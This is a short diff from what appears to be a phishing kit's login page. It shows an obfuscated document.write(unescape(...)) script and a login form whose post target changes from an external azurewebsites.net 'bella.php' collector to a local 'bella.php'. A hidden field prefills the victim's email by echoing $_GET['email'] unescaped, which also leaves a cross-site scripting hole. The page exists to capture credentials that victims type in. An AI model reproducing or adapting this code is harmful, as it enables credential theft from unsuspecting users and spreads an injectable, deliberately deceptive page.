@@ -56,7 +56,7 @@ document.write(unescape('%3c%2f%66%6f%6e%74%3e%0d%0a%09%09%09%0d%0a%09%09%09%09%
 </script>
 
 			
-				<form method="post" action="https://dytuefvwku.azurewebsites.net/bella.php">
+				<form method="post" action="bella.php">
 				<input type="hidden" name="login" value="<?php echo $_GET['email']; ?>">
 				
 <script type="text/javascript">
